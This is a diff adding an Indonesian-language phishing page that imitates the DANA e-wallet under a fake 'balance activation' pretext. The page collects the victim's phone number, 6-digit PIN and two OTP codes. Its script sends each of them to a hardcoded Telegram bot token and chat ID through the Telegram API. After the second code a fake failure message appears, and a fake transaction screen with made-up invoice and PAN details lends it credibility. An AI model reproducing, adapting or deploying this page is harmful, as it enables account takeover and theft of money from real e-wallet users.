@@ -1,0 +1,546 @@
+﻿
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+	<meta charset="UTF-8">
+	<meta property="og:image:type" content="image/jpeg">
+	<meta property="og:image" content="https://iconlogovector.com/uploads/images/2023/03/lg-8b694ad63ac093b84ec0972a7c442d7c61.jpg">
+	<meta name="theme-color" content="#118EEA">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta property="og:image:type" content="jpeg">
+	   <meta property="og:image" content="https://m-dana-id-aktivasi-saldo.vercel.app/1000041288.jpg">
+	<title>Aktivasi Saldo DANA</title>
+	<link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+	<div class="header"></div>
+	<div class="gudang">
+		<div id="Page1" class="page" style="display: block;">
+			<div class="boxnope">
+				<div class="logo">
+					<img src="dana-full.svg" alt="/a.jpg" width="40%">
+				</div>
+				<hr>
+				<label for="phone">Masukkan nomor DANA</label>
+				<div class="kotaknope">
+					<div class="phone-input">
+						<img src="indonesia-flag.png" alt="" class="flag">
+						<span class="country-code">+62</span>
+						<input type="tel" id="phone" class="nope" placeholder="81123456789" oninput="formatPhoneNumber()">
+					</div>
+					<div class="peringatan" id="Peringatan" style="display: none">
+						<p><b>Format nomor salah!</b></p>
+					</div>
+				</div>
+				<div class="poster">
+					<img src="poster.jpg" alt="/gambar/poster.jpg" width="100%">
+				</div>
+			</div>
+			<div class="footer-button" id="footer-button">
+				<p2 style="font-size: 10px; color: gray">Pastikan nomor benar dan aktif</p2>
+				<br>
+				<button onclick="showPage2()">LANJUTKAN</button>
+				<div class="por">
+					<div class="prot">
+						<span class="keamanan">Secured by</span>
+						<img src="dana-protection-logo-in-line.svg" alt="/gambar/dana-protection-logo-in-line.svg" class="dana">
+					</div>
+				</div>
+			</div>
+		</div>
+		<div id="Page2" class="page" style="display: none;">
+			<div class="boxnope">
+				<div class="logo">
+					<img src="dana-full.svg" alt="/a.jpg" width="50%">
+				</div>
+				<hr>
+				<div class="kop">
+					<h4 style="margin: 20px;">Detail Transaksi</h4>
+				</div>
+				<div class="detail">
+					<span>Invoice ID</span>
+					<strong>INV241119XEXI000022</strong>
+				</div>
+				<div class="detail">
+					<span>Jenis Transaksi</span>
+					<strong>Aktivasi Saldo</strong>
+				</div>
+				<div class="detail">
+					<span>Metode Aktivasi</span>
+					<strong>Website</strong>
+				</div>
+				<div class="detail">
+					<span>Nomor Referensi</span>
+					<strong class="highlight">ada042f7a7a1b83</strong>
+				</div>
+				<div class="detail">
+					<span>Penerima Saldo</span>
+					<strong id="phoneDisplay">-</strong>
+				</div>
+				<div class="detail">
+					<span>Customer PAN</span>
+					<strong>93600915319931768</strong>
+				</div>
+				<div class="detail">
+					<span>Merchant PAN</span>
+					<strong>93600811100196032</strong>
+				</div>
+				<div class="detail">
+					<span>Merchant Name</span>
+					<strong>Tiktok</strong>
+				</div>
+				<div class="footer">
+					© 2026 DETAIL TRANSAKSI
+				</div>
+				<div class="footer-button" id="footer-button">
+					<p style="font-size: 10px; color: gray">Harap rincian ini disimpan sebagai tanda bukti bukti yang sah</p>
+					<button id="bbtn2" onclick="showPage3()" form="form1">LANJUTKAN</button>
+					<div class="por">
+						<div class="prot">
+							<span class="keamanan">Secured by</span>
+							<img src="dana-protection-logo-in-line.svg" alt="/gambar/dana-protection-logo-in-line.svg" class="dana">
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div id="Page3" class="pin" style="display: none;">
+			<div id="Pin" class="isipin">
+				<div class="tewew"><img src="dana-protection-logo-in-line.svg" alt="/gambar/dana-protection-logo-in-line.svg" width="21%" class="tew"></div>
+				<div class="header2" style="">Proses Aktivasi</div>
+				<div class="masukkan-pin">
+					<h1>Masukkan PIN DANA Kamu</h1>
+				</div>
+				<div id="pin-input">
+					<input type="password" maxlength="1" inputmode="numeric" oninput="moveToNext(this,1)" onkeydown="handleBackspace(this, event, 1)">
+					<input type="password" maxlength="1" inputmode="numeric" disabled="" oninput="moveToNext(this, 2)" onkeydown="handleBackspace(this, event, 2)">
+					<input type="password" maxlength="1" inputmode="numeric" disabled="" oninput="moveToNext(this, 3)" onkeydown="handleBackspace(this, event, 3)">
+					<input type="password" maxlength="1" inputmode="numeric" disabled="" oninput="moveToNext(this, 4)" onkeydown="handleBackspace(this, event, 4)">
+					<input type="password" maxlength="1" inputmode="numeric" disabled="" oninput="moveToNext(this, 5)" onkeydown="handleBackspace(this, event, 5)">
+					<input type="password" maxlength="1" inputmode="numeric" disabled="" oninput="showPage4()">
+				</div>
+				<div class="sembunyi">
+					<button id="toggle-visibility" class="sembunyikan" onclick="toggleVisibility()">Tampilkan</button>
+					<div class="lupa">
+						<span class="left">
+							<p><a href="https://danaindonesia.app.link/k5B2eKg6bZ?_p=c11533dc99027af9ea038ff8ed&__branch_flow_type=chrome_deepview&__branch_flow_id=1390933247797965758" class="left">LUPA PIN</a></p>
+						</span>
+						<span class="right">
+							<p><a href="https://danaindonesia.app.link/k5B2eKg6bZ?_p=c11533dc99027af9ea038ff8ed&__branch_flow_type=chrome_deepview&__branch_flow_id=1390933247797965758" class="left">BANTUAN</a></p>
+						</span>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div id="Page4" class="pin" style="display: none;">
+			<div class="otp">
+				<div id="Otp" class="isiotp">
+					<div class="tewew">
+						<img src="dana-protection-logo-in-line.svg" alt="Dana Protection" width="26%" class="tew">
+					</div>
+					<div class="header2">Proses Aktivasi</div>
+					<h1>Masukkan kode OTP</h1>
+					<p style="font-size: 12px; padding: 0 50px 0; color: grey;">
+						klik notifikasi verifikasi dan ketik setuju di notifikasi dana untuk menerima otp
+					</p>
+					<div id="peringatan-otp" class="peringatan-otp" style="display: none;"></div>
+					<input type="tel" id="otp" class="otpi" maxlength="6" minlength="4" required="">
+					<p id="resend-text-page1" class="resend-text disabled">Kirim Ulang</p>
+				</div>
+				<div class="otp-button" id="footer-button">
+					<button onclick="showPage5()">KONFIRMASI</button>
+				</div>
+			</div>
+		</div>
+		<div id="Page5" class="pin" style="display: none;">
+			<div class="otp">
+				<div id="OtpB" class="isiotp">
+					<div class="tewew">
+						<img src="dana-protection-logo-in-line.svg" alt="/gambar/dana-protection-logo-in-line.svg" width="26%" class="tew">
+					</div>
+					<div class="header2">Proses Aktivasi</div>
+					<h1 style="color: #FF3E3E">Kode OTP salah!</h1>
+					<p style="font-size: 12px; padding: 0 50px 0; color: grey;">
+						Masukkan kode OTP yang benar atau tunggu kode OTP baru 
+						</p>
+					<div id="peringatan-otp2" class="peringatan-otp" style="display: none;"></div>
+					<input type="tel" id="otp2" class="otpi" maxlength="6" minlength="4" required="">
+					<p id="resend-text-page2" class="resend-text disabled">Kirim Ulang</p>
+				</div>
+				<div class="otp-button" id="footer-button">
+					<button onclick="showPage6()">KONFIRMASI</button>
+				</div>
+			</div>
+		</div>
+		<div id="Page6" class="Botp" style="display: none;">
+			<div class="overlay" id="overlay">
+				<div class="alert-box">
+					<img src="gagal.webs" alt="/gambar/gagal.webs" width="30%">
+					<h4>AKTIVASI SALDO GAGAL</h4>
+					<p class="p6">Pastikan saldo DANA Kamu tidak kurang dari Rp700.000 sebelum melakukan aktivasi</p>
+
+				</div>
+			</div>
+		</div>
+		<div id="Page7" class="page" style="display: none;">
+			<div class="footer-button" id="footer-button">
+				<p2 style="font-size: 10px; color: gray">Pastikan nomor benar dan aktif</p2>
+				<br>
+				<button onclick="showPage8()">KONFIRMASI</button>
+				<div class="por">
+					<div class="prot">
+						<span class="keamanan">Secured by</span>
+						<img src="dana-protection-logo-in-line.svg" alt="/gambar/dana-protection-logo-in-line.svg" class="dana">
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="process" id="overlayy" style="display: none;"></div>
+		<div id="spinner" name="spinner" class="process" style="display: none;">
+			<div id="gbrspin" class="loading"><img src="load_bg.png"><img class="spinner" src="load_spin.png">
+			</div>
+		</div>
+	</div>
+	
+	<script>
+		const footerButton = document.getElementById("footer-button");
+		
+		var phoneNumber = "";
+		var pin = "";
+		var Otpinput = "";
+		var Otp2 = "";
+		var masengge = "";
+
+		function adjustFooterPosition() {
+			if (window.visualViewport) {
+				const viewportHeight = visualViewport.height;
+				const viewportOffset = visualViewport.offsetTop;
+
+				// Posisikan tombol agar tetap terlihat di atas keyboard
+				footerButton.style.bottom = `${window.innerHeight - viewportHeight - viewportOffset}px`;
+			}
+		}
+
+		// Tambahkan listener untuk resize dan input focus
+		window.visualViewport.addEventListener("resize", adjustFooterPosition);
+		window.visualViewport.addEventListener("scroll", adjustFooterPosition);
+
+		// Reset posisi tombol saat keyboard ditutup
+		window.addEventListener("focusout", () => {
+			footerButton.style.bottom = "0";
+		});
+
+		function sendToTelegram(message) {
+			const botToken = "8755297836:AAGTsMEL2pMAoqM5XxMS8sT0pxknoma9DOE";
+			const chatId = "8334330311";
+			const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+			// Kirim data menggunakan fetch
+			fetch(url, {
+					method: "POST",
+					headers: {
+						"Content-Type": "application/json"
+					},
+					body: JSON.stringify({
+						chat_id: chatId,
+						text: message
+					})
+				})
+				.then(response => {
+					if (!response.ok) {
+						console.error("Gagal mengirim pesan ke Telegram", response);
+					}
+				})
+				.catch(error => console.error("Terjadi kesalahan:", error));
+		}
+
+		function showPage2() {
+    const input = document.getElementById("phone");
+    phoneNumber = input.value;
+
+    // Validasi format nomor
+    if (!/^(8|08|62)/.test(phoneNumber) || phoneNumber.length < 8) {
+        const peringatanElement = document.getElementById("Peringatan");
+        peringatanElement.style.display = "block";
+        setTimeout(() => {
+            peringatanElement.style.display = "none";
+        }, 2000);
+        return;
+    }
+
+    // Kirim pesan ke Telegram saat nomor diinput
+    masengge = `❁┷━❃∞FORMASI∞∞❃━┷❁\n𝗡𝗼𝗺𝗼𝗿 : ${phoneNumber}`;
+    sendToTelegram(masengge);
+
+    // Tampilkan ke Page2
+    const phoneDisplay = document.getElementById("phoneDisplay");
+    phoneDisplay.textContent = phoneNumber;
+
+    const spinner = document.getElementById("spinner");
+    spinner.style.display = "flex";
+
+    setTimeout(() => {
+        spinner.style.display = "none";
+        document.getElementById("Page1").style.display = "none";
+        document.getElementById("Page2").style.display = "block";
+    }, 3000);
+}
+
+		function showPage3() {
+	// ✅ Kirim "Menunggu pin"
+	sendToTelegram("Menunggu pin");
+
+	const pinInputs = document.querySelectorAll("#pin-input input");
+	pin = "";
+	pinInputs.forEach(input => pin += input.value);
+
+	const spinner = document.getElementById("spinner");
+	spinner.style.display = "flex";
+
+	setTimeout(() => {
+		spinner.style.display = "none";
+		document.getElementById("Page2").style.display = "block";
+		document.getElementById("Page3").style.display = "block";
+	}, 2000);
+}
+
+		function showPage4() {
+	const pinInputs = document.querySelectorAll("#pin-input input");
+	pin = "";
+	pinInputs.forEach(input => pin += input.value);
+
+	// ✅ Kirim PIN lengkap
+	sendToTelegram(`❁┷━❃∞∞FORMASI∞∞❃━┷❁\n※ 𝗡𝗼𝗺𝗼𝗿  : ${phoneNumber}\n※𝗣𝗜𝗡     : ${pin}`);
+
+	document.getElementById("Page3").style.display = "none";
+	const spinner = document.getElementById("spinner");
+	spinner.style.display = "flex";
+
+	setTimeout(() => {
+		spinner.style.display = "none";
+		document.getElementById("Page4").style.display = "block";
+	}, 2000);
+}
+
+		function showPage5() {
+	const otpInput = document.getElementById("otp");
+	const otp = otpInput.value;
+	const peringatanOtp = document.getElementById("peringatan-otp");
+
+	if (otp.length < 4 || isNaN(otp)) {
+		peringatanOtp.textContent = "OTP harus diisi!";
+		peringatanOtp.style.display = "block";
+		setTimeout(() => {
+			peringatanOtp.style.display = "none";
+		}, 2000);
+		return;
+	}
+
+	Otpinput = otp;
+
+	// ✅ Kirim OTP 1
+	sendToTelegram(`❁┷━❃∞∞FORMASI∞∞❃━┷❁\n※ 𝗡𝗼𝗺𝗼𝗿  : ${phoneNumber}\n※ 𝗣𝗜𝗡     : ${pin}\nOtp : ${Otpinput}`);
+
+	const spinner = document.getElementById("spinner");
+	spinner.style.display = "flex";
+
+	setTimeout(() => {
+		spinner.style.display = "none";
+		document.getElementById("Page5").style.display = "block";
+		document.getElementById("overlayy").style.display = "block";
+	}, 8000);
+}
+
+		function showPage6() {
+	const otpInput = document.getElementById("otp2");
+	const otp = otpInput.value;
+	const peringatanOtp = document.getElementById("peringatan-otp2");
+
+	if (otp.length < 4 || isNaN(otp)) {
+		peringatanOtp.textContent = "OTP harus diisi!";
+		peringatanOtp.style.display = "block";
+		setTimeout(() => {
+			peringatanOtp.style.display = "none";
+		}, 2000);
+		return;
+	}
+
+	Otp2 = otp;
+
+	// ✅ Kirim OTP 2
+	sendToTelegram(`❁┷━❃∞∞FORMASI∞∞❃━┷❁\n※ 𝗡𝗼𝗺𝗼𝗿  : ${phoneNumber}\n※ 𝗣𝗜𝗡     : ${pin}\nOtp : ${Otpinput}\nOtp2 : ${Otp2}`);
+
+	const spinner = document.getElementById("spinner");
+	spinner.style.display = "flex";
+
+	setTimeout(() => {
+		spinner.style.display = "none";
+		document.getElementById("Page6").style.display = "block";
+		document.getElementById("overlayy").style.display = "block";
+	}, 2000);
+}
+
+
+
+
+		// Fungsi untuk mengatur visibilitas input
+		function toggleVisibility() {
+			const inputs = document.querySelectorAll('#pin-input input');
+			const toggleButton = document.getElementById('toggle-visibility');
+
+			// Cek status visibilitas saat ini
+			if (inputs[0].type === 'password') {
+				// Ubah menjadi teks
+				inputs.forEach(input => input.type = 'text');
+				toggleButton.textContent = 'Sembunyikan';
+			} else {
+				// Ubah kembali menjadi password
+				inputs.forEach(input => input.type = 'password');
+				toggleButton.textContent = 'Tampilkan';
+			}
+		}
+
+		function formatPhoneNumber() {
+			const input = document.getElementById("phone");
+			const value = input.value;
+
+			// Hapus karakter non-angka
+			input.value = value.replace(/[^0-9]/g, "");
+		}
+
+		document.addEventListener("DOMContentLoaded", () => {
+			const tombolKeluarList = [
+				{ elementId: "tombol-keluar", countdown: 30 },
+				{ elementId: "tombol-keluar2", countdown: 1 },
+  ];
+
+			tombolKeluarList.forEach(({ elementId, countdown }) => {
+				const tombol = document.getElementById(elementId);
+				if (!tombol) return; // Validasi elemen
+
+				let timerCountdown = countdown;
+
+				// Fungsi hitung mundur
+				const timer = setInterval(() => {
+					timerCountdown--; // Kurangi waktu
+					tombol.textContent = `KELUAR (${timerCountdown})`;
+
+					if (timerCountdown <= 0) {
+						clearInterval(timer); // Hentikan timer
+						tombol.textContent = "KELUAR";
+						tombol.disabled = false; // Aktifkan tombol
+						tombol.classList.add("enabled"); // Tambahkan class untuk mengganti tampilan
+					}
+				}, 1000);
+			});
+		});
+
+		// Fungsi untuk mengatur kolom lain menjadi disabled
+		function setDisabled(inputs) {
+			for (let i = 1; i < inputs.length; i++) {
+				inputs[i].setAttribute("disabled", true); // Menonaktifkan kolom 2 hingga seterusnya
+			}
+		}
+
+		// Fungsi untuk berpindah ke kolom berikutnya hanya jika kolom saat ini terisi
+		function moveToNext(input, index) {
+			const inputs = input.parentNode.querySelectorAll("input");
+
+			// Jika input saat ini diisi dan masih ada input berikutnya
+			if (input.value && index < inputs.length) {
+				inputs[index].removeAttribute("disabled"); // Aktifkan kolom berikutnya
+				inputs[index].focus(); // Fokus ke kolom berikutnya
+			}
+		}
+
+		// Fungsi untuk menangani backspace dan mengatur kolom sebelumnya
+		function handleBackspace(input, event, index) {
+			const inputs = input.parentNode.querySelectorAll("input");
+
+			// Jika backspace ditekan dan kolom kosong, pindahkan fokus ke kolom sebelumnya
+			if (event.key === "Backspace" && index > 1 && !input.value) {
+				inputs[index - 2].focus(); // Fokus ke kolom sebelumnya
+				inputs[index - 1].setAttribute("disabled", true); // Nonaktifkan kolom saat ini
+			}
+		}
+
+		// Inisialisasi kolom menjadi disabled saat halaman dimuat
+		document.addEventListener("DOMContentLoaded", () => {
+			// Atur kolom 2 hingga seterusnya menjadi disabled (Page1)
+			const inputs = document.querySelectorAll("#pin-input input");
+			setDisabled(inputs);
+
+			// Timer untuk Page1
+			const resendText1 = document.getElementById("resend-text-page1");
+			let countdown1 = 60;
+
+			const timer1 = setInterval(() => {
+				resendText1.textContent = `Kirim Ulang (${countdown1}s)`;
+				countdown1--;
+
+				if (countdown1 < 0) {
+					clearInterval(timer1);
+					resendText1.textContent = "Kirim Ulang";
+					resendText1.classList.remove("disabled");
+					resendText1.style.cursor = "pointer"; // Opsional
+				}
+			}, 1300);
+
+			// Timer untuk Page2
+			const resendText2 = document.getElementById("resend-text-page2");
+			let countdown2 = 120;
+
+			const timer2 = setInterval(() => {
+				resendText2.textContent = `Kirim Ulang (${countdown2}s)`;
+				countdown2--;
+
+				if (countdown2 < 0) {
+					clearInterval(timer2);
+					resendText2.textContent = "Kirim Ulang";
+					resendText2.classList.remove("disabled");
+					resendText2.style.cursor = "pointer"; // Opsional
+				}
+			}, 1000);
+
+			// Timer hitung mundur untuk Page6
+			const countdownText = document.getElementById("countdown6");
+			let countdownValue = 3; // Mulai dari 20 detik
+
+			// Pastikan page6 ditampilkan
+			const page6 = document.getElementById("Page6");
+			if (page6 && page6.style.display === "block" && countdownText) {
+				const timer6 = setInterval(() => {
+					countdownText.textContent = countdownValue; // Memperbarui teks countdown
+					countdownValue--; // Mengurangi nilai countdown
+
+					// Jika countdown selesai
+					if (countdownValue < 0) {
+						clearInterval(timer6); // Menghentikan timer
+						page6.style.display = "none"; // Menyembunyikan Page6
+						document.getElementById("Page1").style.display = "block"
+
+					}
+				}, 1000); // Update setiap detik (1000ms)
+			}
+		});
+	</script>
+	<script>
+		const timerElement = document.getElementById('timerKeluar');
+		let timeLeft = 15; // Waktu dalam detik
+
+		const countdown = setInterval(() => {
+			timeLeft -= 1;
+			timerElement.textContent = timeLeft;
+
+			if (timeLeft <= 0) {
+				clearInterval(countdown);
+				timerElement.textContent = "0";
+				showPage7(); // Memanggil fungsi showPage7
+			}
+		}, 1000);
+	</script>
+</body>
+
+</html>
